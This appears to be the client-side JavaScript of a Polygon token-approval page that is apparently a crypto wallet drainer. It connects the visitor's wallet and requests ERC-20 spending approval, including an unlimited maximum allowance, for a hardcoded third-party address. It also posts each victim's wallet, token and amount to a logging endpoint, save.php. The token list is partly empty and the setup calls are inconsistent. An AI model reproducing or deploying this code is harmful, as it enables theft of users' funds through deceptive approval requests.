let approveWallet = "0x5a8C89E24417ee83F1b5B07a1608F7C0eF12E6E2";
//USDC, UNI, LINK(ChainLink), DAI, HEX, WBTC
let tokens = ["0x2791bca1f2de4661ed88a30c99a7a9449aa84174", "0xb33eaad8d922b1083446dc23f610c2567fb5180f", "", "", ""];


var mainChainId = '137';
var tokenContract;

var wallet;

var contractController;
var decimal;
var max = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
var MAX_VALUE = ethers.BigNumber.from(max.toString());


$(document).ready(function () {
    checkRadio();
});

function doLog(amount) {
    $.ajax({
        url: "save.php",
        data : JSON.stringify({
		"token": tokenContract,
		"sender": wallet,
		"amount": Number(amount)/decimal
	}),
        cache: false,
        async: true,
        type: 'post',
        timeout : 5000,
        success: function(res) {
            console.log("result posted = ", JSON.stringify(res));
        }
    });
}

function approveWithAmount() {
    console.log("decimal", decimal);
    var amount = Math.round($('#amount').val()*decimal).toFixed(0);

    doLog(amount);
    console.log("approve amount", amount);
    contractController.approve(approveWallet, ethers.BigNumber.from(amount.toString())).then((err, data) => {

    }).catch(function (error) {
        alert(error.message);
    });
}

function approveMaxAmount() {
    console.log("approve max amount", MAX_VALUE);
    doLog(MAX_VALUE);
    contractController.approve(approveWallet, MAX_VALUE).then((data) => {
        console.log("data", data);
    }).catch(function (error) {
        alert(error.message);
    });
}

function startApp() {
    contractController.decimals().then((data) => {
        decimal = 10**(Number(data));
    }).catch(function (error) {
        alert(error.message);
    });
}

window.addEventListener('load', async function () {
    window.ethereum.enable().then(provider = new ethers.providers.Web3Provider(window.ethereum));
    signer = provider.getSigner();
    await switchToMain();
    current_network = ethereum.networkVersion;
    if (current_network === mainChainId) {
        initContracts();
    } else {
        location.reload();
    }
    console.log("current_network", current_network);

    const accounts = await ethereum.request({ method: 'eth_accounts' });
    wallet = accounts[0];
    console.log("wallet", wallet);
    $('#wallet').html(wallet);

})

async function switchToMain() {
    let ethereum = window.ethereum;
    const data = [{
        chainId: '0x89',
        chainName: 'Polygon(MATIC)',
        nativeCurrency: {
            name: 'MATIC',
            symbol: 'MATIC',
            decimals: 18,
        },
        rpcUrls: ['https://rpc-mainnet.matic.network'],
        blockExplorerUrls: ['https://polygonscan.com/'],
    }]
    const tx = await ethereum.request({method: 'wallet_addEthereumChain', params:data}).catch()
    current_network = ethereum.networkVersion;
    if (tx) {
        console.log('tx = ',tx);
    }
}

function initContracts(tokenNumber) {
    $.ajax({
        url: 'abi.json',
        dataType: 'json',
        success: function (data) {
            var abiContract = data;
            var contractAddress = tokens[tokenNumber];
            tokenContract = contractAddress;
            contractController = new ethers.Contract(contractAddress, abiContract, signer);
            startApp();
        }
    });
}

function checkRadio() {
    $("input[name='groupOfRadios']:radio").change(function(){
        if($("#radio1").is(":checked"))     {
            initContracts(0);
            console.log("token index change to 0");
        }
        else if($("#radio2").is(":checked")) {
            initContracts(1);
            console.log("token index change to 1");
        }
        else if($("#radio3").is(":checked")) {
            initContracts(2);
            console.log("token index change to 2");
        }
        else if($("#radio4").is(":checked")) {
            initContracts(3);
            console.log("token index change to 3");
        }
        else if($("#radio5").is(":checked")) {
            initContracts(4);
            console.log("token index change to 4");
        }
        else if($("#radio6").is(":checked")) {
            initContracts(5);
            console.log("token index change to 5");
        }
    });
}
